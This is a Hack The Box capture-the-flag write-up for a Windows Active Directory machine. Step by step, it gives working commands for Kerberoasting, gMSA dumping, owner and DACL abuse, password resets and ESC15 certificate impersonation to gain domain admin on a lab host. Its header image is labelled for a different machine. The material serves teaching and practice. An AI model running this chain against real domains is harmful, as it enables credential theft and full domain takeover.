---
date: 2026-06-30
categories: [Windows, Medium]
---

<img width="300" height="300" alt="Mailing" src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f02ffc4-bf3e-4a15-9350-e0772596b1a7.png" />

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [mrb3n8132](https://app.hackthebox.com/users/2984) & [Sentinal](https://app.hackthebox.com/users/206770)   | [Hack The Box](https://www.hackthebox.com/)     | Medium           | Windows   |

---






## Enumeration


- I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports:

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.72 -oG scan
	/opt/extractports scan
	nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49384,49666,49683,49684,49685,49704,49710,49729 -Pn -sCV 10.10.11.72 -oN ports
	```

	<img width="1661" height="1166" alt="image" src="https://github.com/user-attachments/assets/a4fe02c4-3941-4589-bb92-4097b4b51967" />

-  I found the domain `tombwatcher.htb`, `DC01.tombwatcher.htb` and I add it to the file in the `hosts` file.

- Hack The Box provided initial credentials:

	```python
	Username: henry
	Password: H3nry_987TGV!
	```

- To identify privilege escalation paths, I collected data using `bloodhound-python`:

	```python
	bloodhound-python -c all -u 'henry' -p 'H3nry_987TGV!' -ns 10.10.11.72 -d tombwatcher.htb
	```

## Initial Access (Kerberoast via WriteSPN)

- BloodHound analysis showed that the user `henry` had `WriteSPN` on the account `Alfred`. This allows creating a Service Principal Name (SPN) or otherwise requesting service tickets (TGS) for that account and performing a Kerberoast attack.

- I requested a Kerberos service ticket for `Alfred` (TGS) using a targeted Kerberoast tool:

	```python
	rdate -n 10.10.11.72; ./targetedKerberoast.py -v -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!'
	```

- I crack the hash and get the password in clear text.

	```python
	 hashcat -a 0 hash_alfred /usr/share/wordlists/rockyou.txt
	```

- This produced Alfred's plaintext password (`basketball` in my run).
## Lateral Movement and Group Manipulation

- Re-evaluating BloodHound with Alfred’s credentials revealed that `Alfred` could be added to the `INFRASTRUCTURE` group. I added `Alfred` to that group to leverage further delegated rights:

	```python
	# Add Alfred to INFRASTRUCTURE
	bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "alfred"
	
	# Verify group membership
	net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb"/"alfred"%'basketball' -S "DC01.tombwatcher.htb" 
	```

- Membership in the `Infrastructure` group allowed reading gMSA (Group Managed Service Account) secrets for `Ansible_dev$`. I dumped gMSA data using gMSADumper:

	```python
	python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
	```

- From gMSADumper output I retrieved the NT hash for `Ansible_dev$`.
## Abusing Service Account to Reset Passwords

- `Ansible_dev$` had permissions to force-change passwords for a SAM account. I used the gMSA-derived privileges and the referenced resource on forcing password change to set a new password for the `SAM` user:

	```python
	net rpc password "SAM" -U "tombwatcher.htb"/'ansible_dev$' --pw-nt-hash -S "DC01.tombwatcher.htb"
	```

- With SAM’s account, I inspected accessible shares and found `forensic` (or similar), and importantly saw that `SAM` had `WriteOwner` on user `john`.

## Abusing WriteOwner on john

- Because `SAM` had `WriteOwner` on `john`, I used Impacket’s owneredit and dacledit tools to take ownership and then grant `FullControl` on the `john` user object. After that I reset john’s password to a known value.

	```python
	# Set SAM as owner of John
	python3 owneredit.py -action write -new-owner 'SAM' -target-dn 'CN=john,CN=Users,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'SAM':'Pepe1234!' -dc-ip 10.10.11.72
	
	# Grant FullControl to SAM on John
	python3 dacledit.py -action write -rights FullControl -principal 'SAM' -target-dn 'CN=john,CN=Users,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'SAM':'Pepe1234!' -dc-ip 10.10.11.72
	
	# Reset John's password
	net rpc password john -U tombwatcher.htb/SAM%'Pepe1234!' -S 10.10.11.72
	```

- I authenticated as `john` via WinRM and collected the user flag:

	```python
	evil-winrm -i 10.10.11.72 -u john -p 'Pepe1234!'
	```
## Recovering Deleted ADCS Account and Escalation (ESC15)

- As `john` I enumerated deleted AD objects and found a deleted user `CERT_ADMIN`:

	```python
	Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
	```

- Because `john` had sufficient ADCS-related permissions, I restored the deleted `CERT_ADMIN` object:

	```python
	Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
	```

- After restoring the object, I re-run enumeration (BloodHound) and confirmed `john` had `GenericAll` on the restored `CERT_ADMIN` account. I used the same owner/dacl modification flow to set `john` as owner and grant FullControl on the `CERT_ADMIN` object, then reset its password:

	```python
	python3 owneredit.py  -action write -new-owner 'john' -target-dn 'CN=CERT_ADMIN,OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Pepe1234!' -dc-ip 10.10.11.72
	
	python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'john' -target-dn 'CN=CERT_ADMIN,OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Pepe1234!' -dc-ip 10.10.11.72
	
	net rpc password CERT_ADMIN -U tombwatcher.htb/john%'Pepe1234!' -S 10.10.11.72
	```

- With `CERT_ADMIN` credentials I enumerated certificate templates and found the **WebServer** template vulnerable to an ADCS privilege escalation technique ([ESC15](https://adminions.ca/books/adcs/page/esc15)). I used `certipy-ad` to request a certificate and obtain a certificate that allowed authenticating as `Administrator` (via UPN impersonation or appropriate template abuse), then I authenticated and spawned an LDAP shell to manipulate objects / create a privileged user.

	```python
	# Find vulnerable templates
	certipy-ad find -u CERT_ADMIN -p 'Pepe1234!' -dc-ip 10.10.11.72 -stdout -enabled -vulnerable
	
	# Request a certificate with Administrator UPN
	certipy-ad req -u 'CERT_ADMIN@TOMBWATCHER.htb' -p 'Pepe1234!' -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -template WebServer -application-policies 'Client Authentication' -target 10.10.11.72 -upn Administrator@TOMBWATCHER.htb
	
	# Authenticate using resulting pfx
	certipy-ad auth -pfx administrator.pfx -username administrator -domain TOMBWATCHER.htb -dc-ip 10.10.11.72
	
	# Optionally open an LDAP shell to create a new user
	certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
	```

- Using the elevated certificate context I created a new admin user (`Attacker`) and set its password (or otherwise directly obtained administrative access). Finally I authenticated as that admin via WinRM and retrieved the domain/host flag:

	```python
	evil-winrm -i 10.10.11.72 -u Attacker -p "X<ZSRhspkf_['k>"
	```
